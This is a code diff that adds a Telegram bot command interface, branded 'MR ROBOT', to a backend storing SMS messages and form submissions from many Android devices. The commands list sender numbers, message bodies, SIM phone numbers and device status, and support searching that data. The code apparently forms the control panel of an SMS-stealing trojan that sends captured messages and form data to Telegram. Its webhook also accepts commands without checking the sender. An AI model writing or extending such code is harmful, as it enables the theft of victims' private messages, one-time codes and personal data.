@@ -275,6 +275,7 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
 
   async function sendTelegram(env: Env, text: string): Promise<void> {
     try {
+      if (await isTelegramPaused(env)) return;
       const chatId = await tgChatId(env);
       if (!chatId) return;
       const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
@@ -285,6 +286,29 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
       });
     } catch (e) { console.warn("Telegram send failed", e); }
   }
+
+
+    async function isTelegramPaused(env: Env): Promise<boolean> {
+      try {
+        const rows = await neon(env.NEON_DATABASE_URL)(`SELECT value FROM settings WHERE key = 'telegram_paused' LIMIT 1`);
+        return (rows[0] as { value?: string })?.value === 'true';
+      } catch { return false; }
+    }
+
+    async function tgReply(token: string, chatId: number | string, text: string): Promise<void> {
+      // Telegram max message size = 4096 chars — split if needed
+      const MAX = 3800;
+      const chunks: string[] = [];
+      for (let i = 0; i < text.length; i += MAX) chunks.push(text.slice(i, i + MAX));
+      for (const chunk of chunks) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: "HTML" }),
+        });
+      }
+    }
+  
   
 
 // =================== FCM (Web Crypto JWT) ===================
@@ -1388,6 +1412,377 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
 
 // EventBus Durable Object class lives in the separate `event-bus-worker`
 // Worker (Pages cannot host DO classes directly). See `artifacts/event-bus-worker/`.
+
+  // =================== TELEGRAM BOT COMMANDS ===================
+  type TgUpdate = {
+    update_id: number;
+    message?: {
+      message_id: number;
+      chat: { id: number; type: string; first_name?: string; username?: string };
+      text?: string;
+      date: number;
+    };
+  };
+
+  async function getRecentData(env: Env, hours: number) {
+    const since = new Date(Date.now() - hours * 3600 * 1000).toISOString();
+    const sqlClient = neon(env.NEON_DATABASE_URL);
+    const [msgs, forms] = await Promise.all([
+      sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE received_at > $1::timestamptz ORDER BY received_at DESC LIMIT 30`, [since]),
+      sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE submitted_at > $1::timestamptz ORDER BY submitted_at DESC LIMIT 20`, [since]),
+    ]);
+    return { msgs, forms };
+  }
+
+  function formatRecentData(msgs: unknown[], forms: unknown[], label: string): string {
+    let out = `⏱ <b>${label}</b>\n\n`;
+    if (msgs.length === 0 && forms.length === 0) return out + 'Koi data nahi mila.';
+    if (msgs.length > 0) {
+      out += `📩 <b>Messages (${msgs.length}):</b>\n`;
+      (msgs as Array<Record<string,unknown>>).forEach(m => {
+        const body = String(m.body ?? '').substring(0, 90);
+        out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${body}\n`;
+      });
+    }
+    if (forms.length > 0) {
+      out += `\n📋 <b>Form Data (${forms.length}):</b>\n`;
+      (forms as Array<Record<string,unknown>>).forEach(f => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        out += `• <code>${f.app_id}</code> | ${fields.substring(0, 100)}\n`;
+      });
+    }
+    return out;
+  }
+
+  app.post("/api/telegram/webhook", async (c) => {
+    let body: TgUpdate;
+    try { body = await c.req.json() as TgUpdate; } catch { return c.json({ ok: true }); }
+
+    const msg = body.message;
+    if (!msg?.text) return c.json({ ok: true });
+
+    const chatId = msg.chat.id;
+    const txt = msg.text.trim();
+    const token = c.env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    const db = getDb(c.env);
+
+    // /1h — last 1 hour
+    if (txt === '/1h' || txt.startsWith('/1h ')) {
+      const { msgs, forms } = await getRecentData(c.env, 1);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 1 Hour');
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /24h — last 24 hours
+    if (txt === '/24h' || txt.startsWith('/24h ')) {
+      const { msgs, forms } = await getRecentData(c.env, 24);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 24 Hours');
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /total — total counts
+    if (txt === '/total') {
+      const [appsC, devsC, msgsC, formsC] = await Promise.all([
+        sqlClient(`SELECT COUNT(*) as c FROM apps`),
+        sqlClient(`SELECT COUNT(*) as c FROM devices`),
+        sqlClient(`SELECT COUNT(*) as c FROM messages`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data`),
+      ]);
+      const out = `📊 <b>Total Data (All Apps)</b>\n\n` +
+        `🔷 Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
+        `📱 Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
+        `📩 Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
+        `📋 Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /apps — list all apps
+    if (txt === '/apps') {
+      const rows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
+      let out = `🔷 <b>All Apps (${rows.length}):</b>\n\n`;
+      if (rows.length === 0) { out += 'Koi app nahi mila.'; }
+      rows.forEach(r => {
+        out += `${r.status === 'active' ? '🟢' : '🔴'} <code>${r.appId}</code> — ${r.name}\n`;
+      });
+      out += `\n💡 /app &lt;appId&gt; — detail dekhne ke liye`;
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /app <appId> [deviceId] [searchText] — nested drill-down
+    if (txt.startsWith('/app ')) {
+      const parts = txt.slice(5).trim().split(' ');
+      const appId = parts[0];
+      const deviceId = parts[1] ?? null;
+      const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;
+
+      if (!appId) {
+        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /app &lt;appId&gt; [deviceId] [searchText]'));
+        return c.json({ ok: true });
+      }
+
+      // ── Level 3: /app <appId> <deviceId> <searchText> — search within device ──
+      if (deviceId && searchQuery) {
+        const like = `%${searchQuery}%`;
+        const [msgR, formR] = await Promise.all([
+          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 AND (LOWER(body) LIKE $3 OR LOWER(from_number) LIKE $3 OR LOWER(from_sender) LIKE $3) ORDER BY received_at DESC LIMIT 30`, [appId, deviceId, like]),
+          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 AND LOWER(data::text) LIKE $3 ORDER BY submitted_at DESC LIMIT 15`, [appId, deviceId, like]),
+        ]);
+        let out = `🔍 <b>Search "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
+        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'Koi result nahi mila.'; }
+        if ((msgR as unknown[]).length > 0) {
+          out += `📩 <b>Messages (${(msgR as unknown[]).length}):</b>\n`;
+          (msgR as Array<Record<string,unknown>>).forEach(m => {
+            out += `• <b>${m.from_number}</b> (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+          });
+        }
+        if ((formR as unknown[]).length > 0) {
+          out += `\n📋 <b>Form Data (${(formR as unknown[]).length}):</b>\n`;
+          (formR as Array<Record<string,unknown>>).forEach(f => {
+            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
+            out += `• ${fields.substring(0, 120)}\n`;
+          });
+        }
+        c.executionCtx.waitUntil(tgReply(token, chatId, out));
+        return c.json({ ok: true });
+      }
+
+      // ── Level 2: /app <appId> <deviceId> — show device's full data ──
+      if (deviceId) {
+        const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
+          db.select().from(devices).where(and(eq(devices.appId, appId), eq(devices.deviceId, deviceId))).limit(1),
+          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 ORDER BY received_at DESC LIMIT 25`, [appId, deviceId]),
+          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 ORDER BY submitted_at DESC LIMIT 10`, [appId, deviceId]),
+          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
+          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
+        ]);
+        const dev = devRow[0];
+        let out = `📱 <b>Device: <code>${deviceId}</code></b>\n`;
+        if (dev) {
+          const st = dev.status === 'online' ? '🟢 Online' : '⚫ Offline';
+          out += `${st} | <b>${dev.name}</b>\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '—'} | SIM2: ${dev.sim2Phone ?? '—'}\n`;
+        }
+        out += `\n📩 Messages: <b>${(msgCount[0] as {c:string}).c}</b> | 📋 Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
+        if ((msgRows as unknown[]).length > 0) {
+          out += `\n📩 <b>Recent Messages:</b>\n`;
+          (msgRows as Array<Record<string,unknown>>).forEach(m => {
+            out += `• <b>${m.from_number}</b> (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+          });
+        }
+        if ((formRows as unknown[]).length > 0) {
+          out += `\n📋 <b>Recent Form Data:</b>\n`;
+          (formRows as Array<Record<string,unknown>>).forEach(f => {
+            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
+            out += `• ${fields.substring(0, 120)}\n`;
+          });
+        }
+        out += `\n💡 Search: /app ${appId} ${deviceId} &lt;text&gt;`;
+        c.executionCtx.waitUntil(tgReply(token, chatId, out));
+        return c.json({ ok: true });
+      }
+
+      // ── Level 1: /app <appId> — list devices ──
+      const [devRows, msgCount, formCount] = await Promise.all([
+        db.select().from(devices).where(eq(devices.appId, appId)).orderBy(desc(devices.updatedAt)).limit(20),
+        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [appId]),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [appId]),
+      ]);
+      let out = `🔷 <b>App: <code>${appId}</code></b>\n`;
+      out += `📩 ${(msgCount[0] as {c:string}).c} msgs | 📋 ${(formCount[0] as {c:string}).c} forms\n\n`;
+      if (devRows.length === 0) { out += 'Koi device nahi mila.'; }
+      else {
+        out += `📱 <b>Devices (${devRows.length}):</b>\n`;
+        devRows.forEach(d => {
+          const st = d.status === 'online' ? '🟢' : '⚫';
+          out += `${st} <b>${d.name}</b>\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '—'} | SIM2: ${d.sim2Phone ?? '—'}\n`;
+        });
+        out += `\n💡 Device detail: /app ${appId} &lt;deviceId&gt;`;
+      }
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /search <text> — search + pause notifications
+    if (txt.startsWith('/search ')) {
+      const query = txt.slice(8).trim().toLowerCase();
+      if (!query) {
+        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /search &lt;text&gt;'));
+        return c.json({ ok: true });
+      }
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
+      const like = `%${query}%`;
+      const [msgR, formR] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 OR LOWER(app_id) LIKE $1 ORDER BY received_at DESC LIMIT 25`, [like]),
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE $1 OR LOWER(app_id) LIKE $1 ORDER BY submitted_at DESC LIMIT 15`, [like]),
+      ]);
+      let out = `🔍 <b>Search: "${query}"</b>\n🔕 <i>Notifications paused — /stop se resume karo</i>\n\n`;
+      if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) {
+        out += 'Koi result nahi mila.';
+      }
+      if ((msgR as unknown[]).length > 0) {
+        out += `📩 <b>Messages (${(msgR as unknown[]).length}):</b>\n`;
+        (msgR as Array<Record<string,unknown>>).forEach(m => {
+          out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${String(m.body).substring(0, 90)}\n`;
+        });
+      }
+      if ((formR as unknown[]).length > 0) {
+        out += `\n📋 <b>Form Data (${(formR as unknown[]).length}):</b>\n`;
+        (formR as Array<Record<string,unknown>>).forEach(f => {
+          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+          out += `• <code>${f.app_id}</code> | ${fields.substring(0, 100)}\n`;
+        });
+      }
+      out += `\n\n▶️ /stop — notifications resume karne ke liye`;
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /7d — last 7 days summary
+    if (txt === '/7d' || txt.startsWith('/7d ')) {
+      const { msgs, forms } = await getRecentData(c.env, 168);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 7 Days');
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /online — all currently online devices
+    if (txt === '/online') {
+      const rows = await db.select().from(devices).where(eq(devices.status, 'online')).orderBy(asc(devices.appId)).limit(50);
+      let out = `🟢 <b>Online Devices (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'Koi device online nahi hai.'; }
+      rows.forEach(d => {
+        out += `📱 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  ID: <code>${d.deviceId}</code>\n  SIM: ${d.sim1Phone ?? '—'}\n`;
+      });
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /offline — all offline devices
+    if (txt === '/offline') {
+      const rows = await db.select().from(devices).where(eq(devices.status, 'offline')).orderBy(desc(devices.updatedAt)).limit(30);
+      let out = `⚫ <b>Offline Devices (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'Sab devices online hain!'; }
+      rows.forEach(d => {
+        const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
+        out += `📵 <b>${d.name}</b>\n  App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
+      });
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /dev <deviceId> — quick device lookup across all apps
+    if (txt.startsWith('/dev ')) {
+      const devId = txt.slice(5).trim();
+      if (!devId) {
+        c.executionCtx.waitUntil(tgReply(token, chatId, '❌ Usage: /dev &lt;deviceId&gt;'));
+        return c.json({ ok: true });
+      }
+      const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
+        db.select().from(devices).where(eq(devices.deviceId, devId)).limit(1),
+        sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE device_id=$1 ORDER BY received_at DESC LIMIT 20`, [devId]),
+        sqlClient(`SELECT data, submitted_at FROM form_data WHERE device_id=$1 ORDER BY submitted_at DESC LIMIT 10`, [devId]),
+        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE device_id=$1`, [devId]),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
+      ]);
+      if (!devRow[0]) {
+        c.executionCtx.waitUntil(tgReply(token, chatId, `❌ Device <code>${devId}</code> nahi mila.`));
+        return c.json({ ok: true });
+      }
+      const d = devRow[0];
+      const st = d.status === 'online' ? '🟢 Online' : '⚫ Offline';
+      let out = `📱 <b>${d.name}</b> [${st}]\n`;
+      out += `App: <code>${d.appId}</code> | User: ${d.userId}\n`;
+      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '—'} | SIM2: ${d.sim2Phone ?? '—'}\n`;
+      out += `📩 ${(msgCount[0] as {c:string}).c} msgs | 📋 ${(formCount[0] as {c:string}).c} forms\n\n`;
+      if ((msgRows as unknown[]).length > 0) {
+        out += `📩 <b>Recent Messages:</b>\n`;
+        (msgRows as Array<Record<string,unknown>>).forEach(m => {
+          out += `• <b>${m.from_number}</b>: ${String(m.body).substring(0, 100)}\n`;
+        });
+      }
+      if ((formRows as unknown[]).length > 0) {
+        out += `\n📋 <b>Recent Form Data:</b>\n`;
+        (formRows as Array<Record<string,unknown>>).forEach(f => {
+          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
+          out += `• ${fields.substring(0, 120)}\n`;
+        });
+      }
+      out += `\n💡 Detail: /app ${d.appId} ${devId}`;
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /last <n> — last N messages across all apps (default 10)
+    if (txt.startsWith('/last')) {
+      const n = Math.min(parseInt(txt.split(' ')[1] ?? '10', 10) || 10, 50);
+      const rows = await sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages ORDER BY received_at DESC LIMIT $1`, [n]);
+      let out = `📩 <b>Last ${n} Messages (All Apps)</b>\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'Koi message nahi mila.'; }
+      (rows as Array<Record<string,unknown>>).forEach(m => {
+        out += `• <code>${m.app_id}</code> | <b>${m.from_number}</b>\n  ${String(m.body).substring(0, 90)}\n`;
+      });
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /stats — per-app breakdown
+    if (txt === '/stats') {
+      const appRows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
+      let out = `📊 <b>Per-App Stats</b>\n\n`;
+      const results = await Promise.all(appRows.map(async a => {
+        const [d, m, f] = await Promise.all([
+          sqlClient(`SELECT COUNT(*) as c FROM devices WHERE app_id=$1`, [a.appId]),
+          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [a.appId]),
+          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [a.appId]),
+        ]);
+        return { ...a, d: (d[0] as {c:string}).c, m: (m[0] as {c:string}).c, f: (f[0] as {c:string}).c };
+      }));
+      results.forEach(r => {
+        const st = r.status === 'active' ? '🟢' : '🔴';
+        out += `${st} <code>${r.appId}</code>\n  📱${r.d} | 📩${r.m} | 📋${r.f}\n`;
+      });
+      c.executionCtx.waitUntil(tgReply(token, chatId, out));
+      return c.json({ ok: true });
+    }
+
+    // /stop — resume notifications
+  
+    if (txt === '/stop' || txt === '/release') {
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
+      c.executionCtx.waitUntil(tgReply(token, chatId, '▶️ <b>Notifications resumed!</b>\nAb se phir se notifications aayengi. 🔔'));
+      return c.json({ ok: true });
+    }
+
+    // /start or /help
+    if (txt === '/start' || txt === '/help') {
+      const help = `🤖 <b>MR ROBOT Bot Commands</b>\n\n` +
+        `⏱ /1h — Last 1 hour ka data\n` +
+        `⏱ /24h — Last 24 hours ka data\n` +
+        `⏱ /7d — Last 7 days ka data\n` +
+        `📩 /last [n] — Last N messages (default 10)\n` +
+        `📊 /total — Total counts\n` +
+        `📊 /stats — Per-app breakdown\n` +
+        `🟢 /online — Online devices\n` +
+        `⚫ /offline — Offline devices\n` +
+        `🔷 /apps — Sabhi App IDs\n` +
+        `🔷 /app &lt;appId&gt; — App devices\n` +
+        `🔷 /app &lt;appId&gt; &lt;devId&gt; — Device data\n` +
+        `🔷 /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt; — Device search\n` +
+        `📱 /dev &lt;deviceId&gt; — Quick device lookup\n` +
+        `🔎 /search &lt;text&gt; — Global search (notifications pause)\n` +
+        `▶️ /stop — Notifications resume\n`;
+      c.executionCtx.waitUntil(tgReply(token, chatId, help));
+      return c.json({ ok: true });
+    }
+
+    return c.json({ ok: true });
+  });
+
+  
 
 // =================== WORKER ENTRY ===================
 export default {
